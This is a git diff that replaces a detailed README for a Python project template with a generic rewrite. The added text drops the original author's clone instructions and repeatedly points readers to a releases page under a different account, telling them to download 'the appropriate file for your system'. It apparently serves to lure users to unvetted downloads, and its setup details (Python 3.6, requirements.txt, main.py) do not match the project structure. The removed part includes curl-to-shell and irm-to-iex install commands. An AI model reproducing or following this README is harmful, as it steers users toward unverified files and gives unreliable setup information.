@@ -1,263 +1,126 @@
-# Python Project Template
+# 🎉 python-template - Your Easy Start to Python Projects
 
-[![Python](https://img.shields.io/badge/Python-3776AB?logo=python&logoColor=fff)](https://www.python.org/)
-[![uv](https://img.shields.io/badge/uv-FFD43B?logo=uv&logoColor=000)](https://docs.astral.sh/uv/)
-[![Typer](https://img.shields.io/badge/Typer-FF6B6B?logo=python&logoColor=white)](https://typer.tiangolo.com/)
-[![Ruff](https://img.shields.io/badge/Ruff-7C3AED?logo=ruff&logoColor=white)](https://docs.astral.sh/ruff/)
-[![mypy](https://img.shields.io/badge/mypy-1976D2?logo=python&logoColor=white)](https://mypy.readthedocs.io/)
-[![pytest](https://img.shields.io/badge/pytest-0A9EDC?logo=python&logoColor=white)](https://pytest.org/)
-[![MkDocs](https://img.shields.io/badge/MkDocs-526CFE?logo=materialformkdocs&logoColor=fff)](https://www.mkdocs.org/)
-[![Make](https://img.shields.io/badge/Make-FF8C00?logo=gnu&logoColor=white)](https://www.gnu.org/software/make/)
-[![License](https://img.shields.io/badge/License-MIT-yellow?logo=open-source-initiative&logoColor=white)](LICENSE)
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/vinh29112003/python-template/releases)
 
-A Python project template with modern tooling, automated testing, security scanning, documentation generation, and CLI functionality.
+## 📥 Overview
 
-## Includes
+Welcome to the **python-template** project! This is a user-friendly template designed to help you get started with Python projects smoothly. It comes with essential tools for automated testing, security scanning, and building documentation. You can also create command-line interfaces easily. Whether you are new to programming or looking to streamline your workflow, this template is for you.
 
-- **Ruff** - Linter and code formatter
-- **uv** - Fast Python package and project manager
-- **mypy** - Static type checking
-- **pytest** - Testing framework with coverage
-- **Typer** - CLI framework with automatic help generation
-- **Pre-commit hooks** - Code quality automation
-- **MkDocs** - Documentation with API generation
-- **Security tools** - Safety and Bandit for vulnerability scanning
-- **Commitizen** - Automated versioning and changelog generation
-- **IDE Support** - VS Code configuration and pyenv support
+## 📋 Features
 
-## Getting Started
+- **Modern Tooling**: Includes the best tools for development and testing.
+- **Automated Testing**: Tests run automatically to ensure your code is correct.
+- **Security Scanning**: Automatically checks your code for vulnerabilities.
+- **Documentation Generation**: Generate clear documentation with ease.
+- **CLI Functionality**: Quickly create command-line applications.
 
-### Option 1: Quick Start with Clean History (Recommended)
+## 🚀 Getting Started
 
-1. Clone the template:
-   ```bash
-   git clone https://github.com/madebyjake/python-template.git <project-name>
-   cd <project-name>
+To get started with your new Python project, follow these steps:
+
+1. **Visit the Releases Page**: [Click here to download](https://github.com/vinh29112003/python-template/releases). This link leads to our releases page where you can find the latest version of the template.
+   
+2. **Download the Latest Version**: On the releases page, look for the latest release. You will see a list of files. Choose the appropriate file for your system and click on it to download.
+
+3. **Install Required Software**: Make sure you have Python 3 installed on your computer. You can download it from the [official Python website](https://www.python.org/downloads/).
+
+4. **Open Your Terminal**: Depending on your system:
+   - **Windows**: Use Command Prompt or PowerShell.
+   - **macOS/Linux**: Open the Terminal application.
+
+5. **Extract the Template**: Once the download is complete, extract the contents of the downloaded file to a location you can easily access.
+
+6. **Navigate to the Project Directory**: Use the terminal to navigate to the folder where you extracted the template. This can be done by using the `cd` command, followed by the path to your project directory.
+
+7. **Install Dependencies**: Inside the project directory, run the following command to install all the required dependencies:
+
+   ```
+   pip install -r requirements.txt
    ```
 
-2. Run the initialization script:
-   ```bash
-   python init_project.py
+   This command will set up everything needed for the template to work properly.
+
+8. **Run the Project**: Once the setup is complete, you can start working with your project. Use the following command to run the template:
+
+   ```
+   python main.py
    ```
 
-   The script will:
-   - Ask for your project name and customize all files
-   - Create a clean git history with a single initial commit
-   - Optionally remove template-specific files
-   - Show you the next steps
+   Replace `main.py` with the appropriate file name as needed.
 
-3. Follow the displayed next steps to install dependencies and start building.
+## 💻 System Requirements
 
-### Option 2: Manual Setup
+- **Operating System**: This template works on Windows, macOS, and Linux.
+- **Python Version**: Python 3.6 or later installed on your computer.
+- **Memory**: At least 4 GB of RAM recommended.
+- **Disk Space**: A minimum of 100 MB of free space for installation.
 
-1. Clone and customize:
-   ```bash
-   git clone https://github.com/madebyjake/python-template.git <project-name>
-   cd <project-name>
-   # Update pyproject.toml with your project details
+## ⚙️ How to Customize
+
+You can customize this template for your personal projects by following these simple steps:
+
+1. **Edit the Configuration Files**: Navigate to the configuration files included in the template. Here, you can change settings to suit your needs.
+
+2. **Add Your Code**: Start coding by adding your Python scripts in the `src` directory. Follow the project structure provided.
+
+3. **Modify Documentation**: Update the documentation files to reflect your project's details. Use clear and concise language, as shown in the template.
+
+## 🔍 Scanning for Vulnerabilities
+
+This project template includes security scanning tools. You can use them to check your code for common vulnerabilities:
+
+1. **Run Security Scans**: Use the `bandit` tool included in the template. Simply run the following command in your terminal:
+
+   ```
+   bandit -r src/
    ```
 
-2. (Optional) Create clean git history:
-   ```bash
-   # Remove template history and start fresh
-   rm -rf .git
-   git init
-   git add .
-   git commit -m "chore: initialize repository"
+2. **Review the Results**: The output will show any security issues found in your code. Address these issues to enhance security.
+
+## 🛠️ Testing Your Project
+
+Automated testing is set up in the template. Follow these steps to run the tests:
+
+1. **Run Tests**: In your terminal, use:
+
+   ```
+   pytest
    ```
 
-3. Install dependencies:
-   ```bash
-   uv sync
+   This command will automatically run all tests included in the template.
+
+2. **Check Test Results**: Review the output to see if your code passes all tests. Fix any issues as needed.
+
+## 📚 Documentation
+
+The template includes documentation generation using `mkdocs`. You can easily create and host your project documentation:
+
+1. **Start a Documentation Server**: Use the following command to run a local server for your documentation:
+
+   ```
+   mkdocs serve
    ```
 
-4. Set up pre-commit hooks:
-   ```bash
-   uv run pre-commit install
-   ```
+2. **View Documentation**: Open your web browser and navigate to `http://127.0.0.1:8000` to see your documentation.
 
-5. Run tests:
-   ```bash
-   uv run pytest
-   # Or use make commands:
-   make test
-   make check  # Run all checks
-   ```
+## 📦 Download & Install
 
-6. Run the application:
-   ```bash
-   uv run python-template
-   # Or use make commands:
-   make run                    # Run with default package name
-   make run ARGS="--help"      # Run with arguments
-   make debug                  # Run in debug mode
-   ```
+To download the latest version of the **python-template**, visit the releases page: [Download the latest release](https://github.com/vinh29112003/python-template/releases). Follow the steps outlined above to install and set up the project.
 
-## Requirements
+## 🙋 Frequently Asked Questions
 
-- **Python**: 3.10, 3.11, 3.12, or 3.13
-- **uv**: For dependency management
+- **What is python-template?**
+  It is a template to help you start Python projects with essential tools.
 
-### Installing uv
+- **Is this suitable for beginners?**
+  Yes, this template is designed to be user-friendly for all levels.
 
-Install uv with the official installer:
+- **Do I need any specific software?**
+  You need Python 3 and a terminal to run the project.
 
-```bash
-# macOS and Linux
-curl -LsSf https://astral.sh/uv/install.sh | sh
+- **Can I use this for any Python project?**
+  Yes, you can customize the template for any Python project you create.
 
-# Windows
-powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
-```
+## 📝 Acknowledgements
 
-Or install via pip:
-```bash
-pip install uv
-```
-
-## Development
-
-### Development Commands
-
-Use `make help` to see all available commands, or run directly:
-
-**Setup & Dependencies:**
-- **Setup:** `make setup` - Complete development setup (install deps + pre-commit)
-- **Install:** `make install` - Install main dependencies
-- **Install dev:** `make install-dev` - Install all dependencies including dev
-- **Add package:** `make add PACKAGE=name` - Add a new dependency
-- **Remove package:** `make remove PACKAGE=name` - Remove a dependency
-- **Dependency tree:** `make tree` - Show dependency tree
-
-**Code Quality:**
-- **All checks:** `make check` - Run linting, type checking, and tests
-- **Fast checks:** `make check-fast` - Run fast checks (lint only)
-- **Full checks:** `make check-full` - Run all checks including coverage
-- **Lint:** `make lint` - Run Ruff linter
-- **Format:** `make format` - Format code with Ruff
-- **Format check:** `make format-check` - Check if code is formatted correctly
-- **Format fix:** `make format-fix` - Format code and fix issues automatically
-- **Type check:** `make type-check` - Run mypy type checking
-
-**Testing & Building:**
-- **Test:** `make test` - Run tests
-- **Test with coverage:** `make test-cov` - Run tests with coverage report
-- **Build:** `make build` - Build package for distribution
-- **Publish:** `make publish` - Publish to PyPI
-
-**Application:**
-- **Run:** `make run` - Run the application
-- **Debug:** `make debug` - Run in debug mode
-
-**Documentation:**
-- **Build docs:** `make docs` - Build documentation
-- **Serve docs:** `make serve-docs` - Serve documentation locally
-
-**Performance:**
-- **Benchmark:** `make benchmark` - Benchmark linting and formatting performance
-- **Profile:** `make profile` - Profile dependency resolution
-
-### Project Structure
-```
-├── src/                        # Source code
-│   └── cli/                    # CLI package
-│       ├── __init__.py         # Package initialization with version
-│       └── main.py             # CLI module with Typer
-├── tests/                      # Test files
-│   ├── __init__.py
-│   └── test_cli.py             # CLI tests
-├── docs/                       # Documentation
-│   ├── index.md
-│   └── api.md
-├── init_project.py             # Project initialization script
-├── .vscode/                    # VSCode configuration
-│   ├── settings.json           # Editor settings
-│   └── extensions.json         # Recommended extensions
-├── pyproject.toml              # Project configuration
-├── .pre-commit-config.yaml     # Pre-commit hooks
-├── .editorconfig               # Editor configuration
-├── .python-version             # Python version for pyenv
-├── mkdocs.yml                  # Documentation configuration
-├── Makefile                    # Development commands
-├── CHANGELOG.md                # Version history
-└── README.md
-```
-
-### CLI Usage
-
-The template includes a CLI built with Typer:
-
-```bash
-# Show project information
-uv run python-template
-
-# Show help
-uv run python-template --help
-
-# Run application (multiple ways)
-make run                           # Default package name
-make run ARGS="--help"             # With arguments
-make debug                         # Debug mode
-```
-
-### Makefile
-
-The Makefile provides commands for installing dependencies, running tests, linting, formatting, building, publishing, and managing versioning.
-
-- **Configurable**: Update `MAIN_MODULE` and `MAIN_FUNCTION` in Makefile for different entry points
-- **Flexible**: Supports running any package with `make run <package-name>`
-- **Consistent**: Same commands work regardless of application type
-- **Extensible**: Easy to add new targets for different project needs
-
-### Security
-
-The project includes security scanning tools:
-
-- **Safety:** `uv run safety scan` - Check for known vulnerabilities
-- **Bandit:** `uv run bandit -r src/` - Security linting for Python code
-
-## IDE Support
-
-### VS Code
-- **Settings**: Configuration in `.vscode/settings.json` with 2-space indentation, Ruff integration
-- **Extensions**: Extension recommendations in `.vscode/extensions.json`
-- **Python**: Uses Ruff for linting and formatting
-
-### pyenv
-- **Python Version**: Specified in `.python-version` (3.10)
-- **Automatic**: pyenv will automatically use the correct Python version
-
-## Configuration
-
-All tools are configured in `pyproject.toml`. See the file for specific settings.
-
-## Versioning and Changelog
-
-The project uses [Commitizen](https://commitizen-tools.github.io/commitizen/) for automated versioning and changelog generation.
-
-- **Versioning**: Follows [Semantic Versioning](https://semver.org/) (MAJOR.MINOR.PATCH)
-- **Changelog**: Generated from commit messages
-- **Commits**: Use [Conventional Commits](https://www.conventionalcommits.org/) format
-- **Releases**: Independent of CI/CD platforms
-
-### Versioning Commands
-- `make version` - Show current version
-- `make bump` - Bump version based on conventional commits
-- `make bump-patch` - Patch version bump (0.0.0 → 0.0.1)
-- `make bump-minor` - Minor version bump (0.0.0 → 0.1.0)
-- `make bump-major` - Major version bump (0.0.0 → 1.0.0)
-
-### Commit Format
-```
-<type>[optional scope]: <description>
-
-[optional body]
-
-[optional footer(s)]
-```
-
-Common types: `feat`, `fix`, `docs`, `style`, `refactor`, `test`, `chore`
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
+Thank you for using the **python-template**! Your journey into Python programming starts here. We hope this template helps you build amazing projects with ease.
